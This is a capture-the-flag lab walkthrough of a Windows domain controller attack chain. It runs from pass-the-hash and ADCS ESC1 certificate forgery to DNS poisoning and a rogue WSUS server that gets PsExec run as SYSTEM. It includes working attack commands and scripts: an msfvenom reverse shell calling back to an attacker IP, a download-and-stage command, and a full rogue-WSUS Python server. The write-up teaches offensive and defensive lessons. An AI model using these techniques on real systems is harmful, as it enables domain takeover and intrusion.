Machine Overview

Logging is a Windows Domain Controller machine centred around two advanced techniques. The user flag path abuses ADCS ESC1 to forge a certificate for wsus.logging.htb using a Managed Service Account hash. The root flag path weaponises the Windows Update Agent itself — DNS is poisoned to redirect the DC's WSUS client to a rogue Python HTTPS server that serves a Microsoft-signed binary (PsExec64.exe) as a fake update, which WUA installs and executes as NT AUTHORITY\SYSTEM.

◈
Full Attack Chain: MSA hash retrieval → evil-winrm WinRM shell → certipy ADCS ESC1 for wsus.logging.htb TLS cert → DNS A record poisoned to Kali → rogue WSUS HTTPS server serves PsExec64.exe → WUA installs as SYSTEM → PsExec runs cmd.exe redirecting root.txt to C:\temp\flag.txt → read via WinRM.

02
LDAP / AD Enumeration
Reconnaissance · Phase 02

Anonymous or credentialed LDAP enumeration surfaces the critical AD objects needed for the attack chain. Key findings: a Managed Service Account, a scheduled task user, the ADCS CA, and a WSUS DNS alias.

◈
Key AD Objects Identified:
• msa_health$ — Managed Service Account used for health monitoring; NT hash retrievable
• jaylee.clifton — runs scheduled task UpdateMonitor every 3 minutes (triggers WUA)
• toby.brynleigh — holds the root flag on their desktop
• logging-DC01-CA — ADCS Certificate Authority trusted by DC01
• wsus.logging.htb — DNS alias for internal WSUS; target for DNS poisoning

Initial Access — msa_health$ WinRM Shell

03
MSA NT Hash Retrieval
Initial Access · Phase 03

Managed Service Account (MSA) password hashes are stored in AD and are retrievable by privileged domain members or through initial credential access (AS-REP roasting, password spraying, or other starting vectors). The msa_health$ NT hash is extracted and used directly for NTLM pass-the-hash authentication.

output — msa_health$ hash
msa_health$ NT: 603fc24ee01a9409f83c9d1d701485c5
✓
MSA Hash Obtained: msa_health$ : 603fc24ee01a9409f83c9d1d701485c5 (NT hash)
04
WinRM Shell via Pass-the-Hash
Initial Access · Phase 04

evil-winrm accepts NT hashes directly for NTLM pass-the-hash authentication, bypassing the need to crack the MSA password. The MSA account has WinRM access on DC01.

bash
evil-winrm -i 10.129.103.253 -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5'
output
Evil-WinRM shell v3.x
*Evil-WinRM* PS C:\Users\msa_health$\Documents> whoami
logging\msa_health$
✓
Shell Obtained: WinRM session on DC01 as logging\msa_health$ via NTLM pass-the-hash.

// 05

Privilege Escalation — WSUS Spoofing → SYSTEM

DC01 runs Windows Update Agent (wuauserv) configured to fetch updates from wsus.logging.htb:8531 over HTTPS. A scheduled task (UpdateMonitor, running as jaylee.clifton) fires every 3 minutes and triggers WUA to check for and install updates. The attack redirects the WSUS hostname to Kali and serves a Microsoft-signed binary as a fake update that WUA installs as SYSTEM.

06
ADCS ESC1 — Forge TLS Cert for wsus.logging.htb
WSUS Spoofing · Phase 06

WUA enforces HTTPS and validates the WSUS server certificate against trusted CAs. The internal CA logging-DC01-CA is trusted by DC01. ESC1 allows any authenticated user to request a certificate with an arbitrary Subject Alternative Name — we request one for wsus.logging.htb, producing a valid TLS certificate that WUA will trust unconditionally.

bash — request cert with wsus.logging.htb SAN
certipy req -u 'msa_health$@logging.htb' \
    -hashes ':603fc24ee01a9409f83c9d1d701485c5' \
    -ca 'logging-DC01-CA' \
    -template 'User' \
    -upn 'wsus.logging.htb' \
    -dns 'wsus.logging.htb' \
    -dc-ip 10.129.103.253
bash — extract PEM cert and key
certipy cert -pfx wsus.pfx -nokey -out /tmp/wsus.crt
certipy cert -pfx wsus.pfx -nocert -out /tmp/wsus.key
✓
Valid TLS Cert Obtained: Certificate signed by logging-DC01-CA with SAN wsus.logging.htb — DC01's WUA will trust this cert fully.
✕
ADCS ESC1: The User certificate template allows requesters to specify arbitrary SANs, enabling any authenticated principal to obtain a TLS certificate for any hostname — including internal service FQDNs like WSUS. This completely breaks the trust model of internal HTTPS services.
07
DNS Poisoning — wsus.logging.htb → Kali
WSUS Spoofing · Phase 07

Add a DNS A record pointing wsus.logging.htb to our Kali IP via the msa_health$ WinRM session (PowerShell) or remotely via dnstool.py. When the WSUS client next resolves the hostname, it will connect to Kali instead of the real WSUS server.

powershell — via evil-winrm on DC01
Add-DnsServerResourceRecordA -Name "wsus" -ZoneName "logging.htb" `
    -IPv4Address "10.10.14.10" -AllowUpdateAny
bash — alternative: dnstool.py remote injection
python3 dnstool.py -u 'logging.htb\msa_health$' \
    --hashes ':603fc24ee01a9409f83c9d1d701485c5' \
    -r wsus.logging.htb -a add -d 10.10.14.10 \
    10.129.103.253
✓
DNS Poisoned: wsus.logging.htb A record now resolves to 10.10.14.10 (Kali). All WSUS client traffic will be redirected.
08
Stage Payload on DC01
WSUS Spoofing · Phase 08

WUA enforces Authenticode signing on all update executables — serving an unsigned msfvenom payload fails with error 0x800B0100 (TRUST_E_NOSIGNATURE). The solution: serve PsExec64.exe (Microsoft-signed, Authenticode valid) as the update binary. Its -s flag runs any target command as SYSTEM. The actual payload (flag exfil or reverse shell) is passed as the command string to PsExec — bypassing the signing requirement entirely.

bash — generate reverse shell (alternative approach)
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=10.10.14.10 LPORT=4444 \
    -f exe -o /tmp/rev.exe
python3 -m http.server 8080
powershell — stage rev.exe on DC01 via WinRM
Invoke-WebRequest -Uri "http://10.10.14.10:8080/rev.exe" `
    -OutFile "C:\temp\rev.exe"
⚠
Authenticode Requirement: WUA calls WinVerifyTrust on every update executable before installation. Serving unsigned payloads fails silently — EventID 161 logs error 0x800B0100. Always serve a Microsoft-signed binary (e.g. PsExec64.exe, klist.exe) and chain to the actual payload via its arguments.
09
Rogue WSUS Server — wsuks Python Standalone
WSUS Spoofing · Phase 09

The wsuks Python library implements a WSUS spoofing server. Its CLI (wsuks serve) crashes on Kali because router.py unconditionally imports from nftables import Nftables — a package not available on Kali. The fix: instantiate WSUSUpdateHandler and WSUSBaseServer directly, bypassing the CLI and the broken router import entirely.

◈
WSUS SOAP Flow: WUA communicates via four SOAP requests. The rogue server must respond correctly to all four for WUA to download and install the update.
WUA RequestRogue WSUS Response
GetConfigReturns basic WSUS config accepted by WUA
GetCookieIssues authentication cookie for the session
SyncUpdatesReturns two UpdateInfo objects (bundle + leaf, fresh UUIDs) marked IsAssigned=true
GetExtendedUpdateInfoReturns file metadata: SHA1/SHA256 of PsExec64.exe, download URL, and the Arguments string for CommandLineInstallation handler
python3 — /tmp/wsus_standalone.py
import sys, os, ssl, logging
from functools import partial
from http.server import HTTPServer

sys.path.insert(0, '/home/kali/.local/lib/python3.13/site-packages')
from wsuks.lib.wsusserver import WSUSUpdateHandler, WSUSBaseServer

HOST_IP    = '10.10.14.10'
HOST_PORT  = 8531
TLS_CERT   = '/tmp/wsus.crt'
TLS_KEY    = '/tmp/wsus.key'
EXECUTABLE = '/tmp/PsExec64.exe'   # Microsoft-signed
WSUS_HOST  = 'wsus.logging.htb'

# PsExec -s: run as SYSTEM; redirect root.txt to world-readable temp file
COMMAND = r'-accepteula -s cmd.exe /c "type C:\Users\toby.brynleigh\Desktop\root.txt > C:\temp\flag.txt 2>&1"'

logging.basicConfig(level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(message)s')

with open(EXECUTABLE, 'rb') as f:
    exe_data = f.read()

exe_name        = os.path.basename(EXECUTABLE)
client_location = f"https://{WSUS_HOST}:{HOST_PORT}"

update_handler = WSUSUpdateHandler(exe_data, exe_name, client_location)
update_handler.set_resources_xml(COMMAND)

http_handler = partial(WSUSBaseServer, update_handler)
http_server  = HTTPServer((HOST_IP, HOST_PORT), http_handler)

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile=TLS_CERT, keyfile=TLS_KEY)
context.check_hostname = False
context.verify_mode    = ssl.CERT_NONE
http_server.socket = context.wrap_socket(http_server.socket, server_side=True)

print(f"[*] WSUS server on {HOST_IP}:{HOST_PORT}")
print(f"[*] Serving: {exe_name} | Command: {COMMAND}")
http_server.serve_forever()
⚠
UUID Caching Gotcha: After WUA installs an update, it records the UUID pair as installed and will not reinstall it. Always restart the WSUS server between test iterations — each restart generates fresh uuid.uuid4() pairs, making WUA treat it as a new update.
10
Trigger WUA & Collect Root Flag
WSUS Spoofing · Phase 10

Start the rogue WSUS server, then force an immediate WUA check via wuauclt.exe rather than waiting up to 3 minutes for the scheduled task. WUA performs the four SOAP requests, downloads PsExec64.exe (Authenticode check passes), and installs it as SYSTEM — running the command that writes root.txt to C:\temp\flag.txt.

bash — start rogue WSUS server
python3 /tmp/wsus_standalone.py
[*] WSUS server on 10.10.14.10:8531
[*] Serving: PsExec64.exe
powershell — trigger WUA via evil-winrm
wuauclt.exe /detectnow /updatenow

1. GetConfig         → WSUS config accepted
2. GetCookie         → auth cookie issued
3. SyncUpdates       → new update detected (fresh UUID)
4. GetExtUpdateInfo  → PsExec64.exe metadata served

✓
SYSTEM Achieved: WUA installs and executes PsExec64.exe as NT AUTHORITY\SYSTEM. The command reads toby.brynleigh's root.txt and writes it to C:\temp\flag.txt — readable via the existing WinRM session.

key takeaways
// 01
ADCS ESC1 Breaks All Internal HTTPS Trust
When a certificate template allows requesters to specify arbitrary Subject Alternative Names, any authenticated principal can obtain a valid TLS certificate for any internal hostname — including critical services like WSUS, LDAPS, or internal APIs. Certificate templates must enforce subject name supply from the requester only for explicitly authorised use cases, with strict EKU restrictions.
// 02
WSUS Over HTTP or With a Weak CA Is SYSTEM RCE
The Windows Update Agent runs as SYSTEM and installs whatever the WSUS server serves. If the WSUS server can be spoofed — via DNS poisoning, ARP spoofing, or BGP hijacking — an attacker with a trusted certificate can serve any Microsoft-signed binary with arbitrary arguments as a fake update. WSUS must be configured with SSL pinning, certificate monitoring, and DNS change alerting.
// 03
Authenticode Is a Policy, Not a Sandbox
WUA enforces Authenticode signing on update executables, but the signing requirement only proves the binary is Microsoft-signed — not that the command arguments are safe. Serving PsExec64.exe (legitimately signed by Microsoft) with attacker-controlled arguments completely subverts the intended security boundary. Signed-binary execution policies must be paired with argument auditing and behavioural monitoring.
// 04
MSA Hashes Are Equivalent to Cleartext Passwords
Managed Service Account NT hashes are derivable from their AD-stored password blob by any principal with the required read rights. Pass-the-hash with evil-winrm bypasses the need to crack the hash entirely. MSA accounts must follow least-privilege principles — WinRM access for a health-monitoring service account is an unnecessary and dangerous permission.
// 05
DNS Write Access Is a Lateral Movement Primitive
The ability to add or modify DNS A records on an AD-integrated zone is equivalent to man-in-the-middle capability against any service identified by that name. DNS write permissions must be audited as critically as ACL delegations — any account that can modify zone records can redirect traffic for any internal service to an attacker-controlled host.
// 06
Output Redirection Is Cleaner Than Reverse Shells Through WSUS
Piping a reverse shell through a WSUS-installed process is unreliable — WUA's install process has a short timeout and the session is non-interactive. Redirecting command output to a temp file (> C:\temp\flag.txt) and reading it via an already-authenticated WinRM session is more stable, leaves a persistent artefact, and avoids timeout-related connection drops.
